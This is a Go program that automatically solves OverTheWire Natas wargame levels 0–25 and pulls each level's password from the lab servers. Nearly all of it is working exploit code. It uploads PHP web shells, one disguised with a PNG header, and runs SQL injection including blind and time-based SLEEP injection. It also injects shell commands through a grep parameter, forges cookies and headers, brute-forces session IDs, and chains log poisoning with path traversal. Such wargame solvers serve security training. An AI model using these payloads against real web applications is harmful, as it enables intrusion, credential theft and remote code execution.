package main

import (
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"

	xmlpath "gopkg.in/xmlpath.v2"

	"github.com/MJKWoolnough/errors"
	"github.com/MJKWoolnough/memio"
)

var buf memio.Buffer

type Grabber interface {
	Grab(http.Request) string
}

type Grab struct{}

var grab Grab

func (g Grab) Grab(r http.Request) string {
	buf = buf[:0]
	resp, err := http.DefaultClient.Do(&r)
	e(err)
	io.Copy(&buf, resp.Body)
	resp.Body.Close()
	return string(buf)
}

type Text struct {
	Text string
}

func (t Text) Grab(http.Request) string {
	return t.Text
}

type Prefixed struct {
	Grabber
	Prefix string
	Length int
}

func (p Prefixed) Grab(r http.Request) string {
	source := p.Grabber.Grab(r)
	index := strings.Index(source, p.Prefix)
	if index < 0 || len(source) < index+len(p.Prefix)+p.Length {
		panic(errors.Error("failed to get prefixed data"))
	}
	return source[index+len(p.Prefix) : index+len(p.Prefix)+p.Length]
}

type XPath struct {
	Grabber
	Path string
}

func (x XPath) Grab(r http.Request) string {
	p := xmlpath.MustCompile(x.Path)
	source := x.Grabber.Grab(r)
	h, err := xmlpath.ParseHTML(strings.NewReader(source))
	e(err)
	str, ok := p.String(h)
	if !ok {
		panic(errors.Error("failed to get xpath data"))
	}
	return str
}

type Path struct {
	Grabber
	Path Grabber
}

func (p Path) Grab(r http.Request) string {
	oldPath := r.URL.Path
	r.URL.Path = p.Path.Grab(r)
	s := p.Grabber.Grab(r)
	r.URL.Path = oldPath
	return s
}

type Host struct {
	Grabber
	Host Grabber
}

func (h Host) Grab(r http.Request) string {
	oldHost := r.URL.Host
	r.URL.Host = h.Host.Grab(r)
	s := h.Grabber.Grab(r)
	r.URL.Host = oldHost
	return s
}

type Headers struct {
	Grabber
	Headers SetData
}

func (h Headers) Grab(r http.Request) string {
	newHeaders := make(http.Header)
	for key, value := range r.Header {
		newHeaders[key] = value
	}
	h.Headers.Set(r, newHeaders)
	r.Header = newHeaders
	return h.Grabber.Grab(r)
}

type Post struct {
	Grabber
	Data SetData
	File *File
}

type File struct {
	Field, Name Grabber
	memio.Buffer
}

type MPSetter struct {
	*multipart.Writer
}

func (m MPSetter) Set(key, value string) {
	e(m.WriteField(key, value))
}

func (p Post) Grab(r http.Request) string {
	var b memio.Buffer
	m := multipart.NewWriter(&b)
	p.Data.Set(r, MPSetter{m})
	if p.File != nil {
		rw, err := m.CreateFormFile(p.File.Field.Grab(r), p.File.Name.Grab(r))
		e(err)
		io.Copy(rw, p.File)
	}
	e(m.Close())
	r.Body = &b
	r.Method = http.MethodPost
	r.ContentLength = int64(len(b))
	return Headers{p.Grabber, map[string]Grabber{"Content-Type": Text{m.FormDataContentType()}}}.Grab(r)
}

type Get struct {
	Grabber
	Data SetData
}

func (g Get) Grab(r http.Request) string {
	values := make(url.Values, len(g.Data))
	g.Data.Set(r, values)
	oldQuery := r.URL.RawQuery
	r.URL.RawQuery = values.Encode()
	s := g.Grabber.Grab(r)
	r.URL.RawPath = oldQuery
	return s
}

type Hex2Dec struct {
	Grabber
}

func (h Hex2Dec) Grab(r http.Request) string {
	hx := h.Grabber.Grab(r)
	dec := make([]byte, hex.DecodedLen(len(hx)))
	_, err := hex.Decode(dec, []byte(hx))
	e(err)
	return string(dec)
}

type Reverse struct {
	Grabber
}

func (rv Reverse) Grab(r http.Request) string {
	str := rv.Grabber.Grab(r)
	rts := make([]byte, len(str))
	for n, b := range []byte(str) {
		rts[len(rts)-n-1] = b
	}
	return string(rts)
}

type Base64Decode struct {
	Grabber
}

func (b Base64Decode) Grab(r http.Request) string {
	str := b.Grabber.Grab(r)
	res, err := base64.StdEncoding.DecodeString(strings.Replace(str, "%3D", "=", -1))
	e(err)
	return string(res)
}

type Base64Encode struct {
	Grabber
}

func (b Base64Encode) Grab(r http.Request) string {
	str := b.Grabber.Grab(r)
	return base64.StdEncoding.EncodeToString([]byte(str))
}

type SetData map[string]Grabber

type Setter interface {
	Set(string, string)
}

func (sd SetData) Set(r http.Request, s Setter) {
	for key, g := range sd {
		s.Set(key, g.Grab(r))
	}
}

type Cookie struct {
	Name string
}

var lastCookieURL, lastCookieName, lastCookieValue string

func (c Cookie) Grab(r http.Request) string {
	if r.URL.String() == lastCookieURL && c.Name == lastCookieName {
		return lastCookieValue
	}
	lastCookieURL = r.URL.String()
	lastCookieName = c.Name
	r.Method = http.MethodHead
	resp, err := http.DefaultClient.Do(&r)
	e(err)
	cookies := resp.Cookies()
	for _, cookie := range cookies {
		if cookie.Name == c.Name {
			lastCookieValue = cookie.Value
			return cookie.Value
		}
	}
	panic(errors.Error("could not find cookie"))
}

type XOR struct {
	Input, Key Grabber
}

func (x XOR) Grab(r http.Request) string {
	i := x.Input.Grab(r)
	k := x.Key.Grab(r)
	o := make([]byte, len(i))
	for n, c := range []byte(i) {
		o[n] = c ^ k[n%len(k)]
	}
	return string(o)
}

type FindRepeating struct {
	Grabber
}

func (f FindRepeating) Grab(r http.Request) string {
	str := f.Grabber.Grab(r)
	for length := 1; length < len(str); length++ {
		if r := strings.Repeat(str[:length], 1+(len(str)/length)); r[:len(str)] == str {
			return str[:length]
		}
	}
	return str
}

type Combine struct {
	Prefix, Suffix Grabber
}

func (c Combine) Grab(r http.Request) string {
	prefix := c.Prefix.Grab(r)
	suffix := c.Suffix.Grab(r)
	return prefix + suffix
}

type BruteForcePassword struct {
	Field, Prefix, Suffix, First, Wildcard string
	Grabber
}

func (s BruteForcePassword) Grab(r http.Request) string {
	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890"
	var (
		p = Post{
			s.Grabber,
			SetData{s.Field: nil},
			nil,
		}
		result, knownChars string
	)

	for _, c := range chars {
		p.Data[s.Field] = Text{s.Prefix + s.Wildcard + string(c) + s.Wildcard + s.Suffix}
		if p.Grab(r) == "1" {
			knownChars += string(c)
		}
	}
Loop:
	for {
		for _, c := range knownChars {
			p.Data[s.Field] = Text{s.Prefix + s.First + result + string(c) + s.Wildcard + s.Suffix}
			if p.Grab(r) == "1" {
				result += string(c)
				continue Loop
			}
		}
		return result
	}
}

type NotContain struct {
	Grabber
	NotMatch string
}

func (n NotContain) Grab(r http.Request) string {
	if !strings.Contains(n.Grabber.Grab(r), n.NotMatch) {
		return "1"
	}
	return "0"
}

type Contains struct {
	Grabber
	Match string
}

func (c Contains) Grab(r http.Request) string {
	if strings.Contains(c.Grabber.Grab(r), c.Match) {
		return "1"
	}
	return "0"
}

type TakesTime struct {
	Grabber
	time.Duration
}

func (t TakesTime) Grab(r http.Request) string {
	start := time.Now()
	t.Grabber.Grab(r)
	if time.Now().Sub(start) > t.Duration {
		return "1"
	}
	return "0"
}

type BruteForceCookie struct {
	Grabber
	Range
	CookieName string
}

func (b BruteForceCookie) Grab(r http.Request) string {
	headers := Headers{b.Grabber, SetData{"Cookie": nil}}
	for b.Range.Next() {
		idStr := b.Range.ID()
		headers.Headers["Cookie"] = Text{b.CookieName + "=" + idStr}
		if headers.Grab(r) == "1" {
			return idStr
		}
	}
	panic("no cookie found")
}

type Range interface {
	Next() bool
	ID() string
}

type NumRange struct {
	Start, End int
}

func (r *NumRange) Next() bool {
	r.Start++
	return r.Start <= r.End
}

func (r *NumRange) ID() string {
	return strconv.Itoa(r.Start)
}

type RangeList []Range

func (r *RangeList) Next() bool {
	if len(*r) > 0 {
		if !(*r)[0].Next() {
			*r = (*r)[1:]
			return len(*r) > 0
		}
		return true
	}
	return false
}

func (r *RangeList) ID() string {
	return (*r)[0].ID()
}

type RangeSuffix struct {
	Range
	Suffix string
}

func (r RangeSuffix) ID() string {
	return r.Range.ID() + r.Suffix
}

type RangeHex struct {
	Range
}

func (r RangeHex) ID() string {
	return hex.EncodeToString([]byte(r.Range.ID()))
}

var levels = [...]Grabber{
	//level 0
	Prefixed{grab, "The password for natas1 is ", 32},
	//level 1
	Prefixed{grab, "The password for natas2 is ", 32},
	//level 2
	Path{Prefixed{grab, "natas3:", 32}, Text{"/files/users.txt"}}, // image @ /files/pixel.png, go to folder, find users.txt
	//level 3
	Path{Prefixed{grab, "natas4:", 32}, Text{"/s3cr3t/users.txt"}}, // robots.txt references /s3cr3t/, find users.txt
	//level 4
	Headers{Prefixed{grab, "The password for natas5 is ", 32}, SetData{"Referer": Text{"http://natas5.natas.labs.overthewire.org/"}}},
	//level 5
	Headers{Prefixed{grab, "The password for natas6 is ", 32}, SetData{"Cookie": Text{"loggedin=1"}}},
	//level 6
	Post{Prefixed{grab, "The password for natas7 is ", 32}, SetData{"submit": Text{"Submit Query"}, "secret": Path{Prefixed{grab, "$secret = \"", 19}, Text{"/includes/secret.inc"}}}, nil},
	//level 7
	Get{Prefixed{grab, "<br>\n<br>\n", 32}, SetData{"page": Text{"/etc/natas_webpass/natas8"}}},
	//level 8
	Post{
		Prefixed{grab, "The password for natas9 is ", 32},
		SetData{
			"submit": Text{"Submit Query"},
			"secret": Base64Decode{
				Reverse{
					Hex2Dec{
						Path{
							Prefixed{grab, "$encodedSecret&nbsp;=&nbsp;\"", 32},
							Text{"/index-source.html"},
						},
					},
				},
			},
		},
		nil,
	},
	//level 9
	Get{Prefixed{grab, "/etc/natas_webpass/natas10:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas10"}}},
	//level 10
	Get{Prefixed{grab, "/etc/natas_webpass/natas11:", 32}, SetData{"needle": Text{"-H \"\" /etc/natas_webpass/natas11"}}},
	//level 11
	Headers{
		Prefixed{grab, "The password for natas12 is ", 32},
		SetData{
			"Cookie": Combine{
				Text{"data="},
				Base64Encode{
					XOR{
						Text{"{\"showpassword\":\"yes\",\"bgcolor\":\"#ffffff\"}"},
						FindRepeating{
							XOR{
								Base64Decode{
									Cookie{"data"},
								},
								Text{"{\"showpassword\":\"no\",\"bgcolor\":\"#ffffff\"}"},
							},
						},
					},
				},
			},
		},
	},
	//level 12
	Path{
		Prefixed{grab, "", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("<?php include(\"/etc/natas_webpass/natas13\"); ?>"),
				},
			},
		},
	},
	//level 13
	Path{
		Prefixed{grab, "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a", 32},
		Combine{
			Text{"/"},
			Post{
				XPath{grab, "//a/@href"},
				SetData{
					"filename": Combine{
						XPath{grab, "//form/input[@name='filename']/@value"},
						Text{".php"},
					},
				},
				&File{
					XPath{grab, "//form/input[@type='file']/@name"},
					Text{"exploit.php"},
					memio.Buffer("\x89\x50\x4e\x47\x0d\x0a\x1a\x0a<?php include(\"/etc/natas_webpass/natas14\"); ?>"),
				},
			},
		},
	},
	//level 14
	Post{
		Prefixed{
			grab,
			"The password for natas15 is ",
			32,
		},
		SetData{
			"username": Text{"\" OR password != \"\" #"},
		},
		nil,
	},
	//level 15
	BruteForcePassword{
		"username",
		"natas16\" AND password LIKE BINARY \"",
		"",
		"",
		"%",
		NotContain{grab, "This user doesn't exist."},
	},
	//level 16
	BruteForcePassword{
		"needle",
		"^$(grep -E ",
		" /etc/natas_webpass/natas17)African",
		"^",
		".*",
		NotContain{grab, "African"},
	},
	//level 17
	BruteForcePassword{
		"username",
		"natas18\" AND IF (password LIKE BINARY \"",
		"\", SLEEP(1), null) AND password != \"",
		"",
		"%",
		TakesTime{grab, time.Second},
	},
	//level 18
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				BruteForceCookie{
					Contains{
						grab,
						"You are an admin.",
					},
					&NumRange{0, 640},
					"PHPSESSID",
				},
			},
		},
	},
	//level 19
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				BruteForceCookie{
					Contains{
						grab,
						"You are an admin.",
					},
					RangeHex{
						RangeSuffix{
							&RangeList{
								&NumRange{10, 99},
								&NumRange{1000, 9999},
								&NumRange{100000, 999999},
								&NumRange{10000000, 99999999},
							},
							"-admin",
						},
					},
					"PHPSESSID",
				},
			},
		},
	},
	//level 20
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Text{"PHPSESSID=1"},
			"Upgrade-Insecure-Requests": Post{ // hack to send data before reloading page
				Headers{
					Contains{
						grab,
						"natas21",
					},
					SetData{"Cookie": Text{"PHPSESSID=1"}},
				},
				SetData{
					"name": Text{"a\nadmin 1"},
				},
				nil,
			},
		},
	},
	//level 21
	Headers{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Text{"PHPSESSID=1"},
			"Upgrade-Insecure-Requests": Host{
				Get{
					Post{
						Headers{
							Contains{
								grab,
								"[admin]",
							},
							SetData{"Cookie": Text{"PHPSESSID=1"}},
						},
						SetData{
							"admin":  Text{"1"},
							"submit": Text{""},
						},
						nil,
					},
					SetData{"debug": Text{"1"}},
				},
				Text{"natas21-experimenter.natas.labs.overthewire.org"},
			},
		},
	},
	//level 22
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"revelio": Text{""}},
	},
	//level 23
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"passwd": Text{"11iloveyou"}},
	},
	//level 24
	Get{
		Prefixed{
			grab,
			"Password: ",
			32,
		},
		SetData{"passwd[]": Text{}},
	},
	//level 25
	Headers{
		Prefixed{
			Get{
				Headers{
					grab,
					SetData{"User-Agent": Text{"<?php echo \"Password: \";include(\"/etc/natas_webpass/natas26\"); ?>"}},
				},
				SetData{
					"lang": Combine{
						Combine{
							Text{"....//....//....//....//....//var/www/natas/natas25/logs/natas25_"},
							Cookie{"PHPSESSID"},
						},
						Text{".log"},
					},
				},
			},
			"Password: ",
			32,
		},
		SetData{
			"Cookie": Combine{
				Text{"PHPSESSID="},
				Cookie{"PHPSESSID"},
			},
		},
	},
}

func e(err error) {
	if err != nil {
		panic(err)
	}
}

func main() {
	var (
		level     uint
		password  string
		thisLevel int
	)
	flag.UintVar(&level, "l", 0, "level number. > 0 requires password")
	flag.StringVar(&password, "p", "natas0", "password for initial level")
	flag.Parse()

	r := http.Request{
		Header: make(http.Header),
	}

	http.DefaultClient.CheckRedirect = func(*http.Request, []*http.Request) error {
		return http.ErrUseLastResponse
	}

	defer func() {
		if err := recover(); err != nil {
			log.Printf("natas %2d: error: %s", thisLevel, err)
		}
	}()

	for n, grabber := range levels[level:] {
		thisLevel = int(level) + n

		log.Printf("natas %2d: Solving...", thisLevel)

		r.URL, _ = url.Parse(fmt.Sprintf("http://natas%d.natas.labs.overthewire.org/", thisLevel))
		r.SetBasicAuth(fmt.Sprintf("natas%d", thisLevel), password)

		password = grabber.Grab(r)
		log.Printf("natas %2d: Password: %s", thisLevel, password)
	}
}
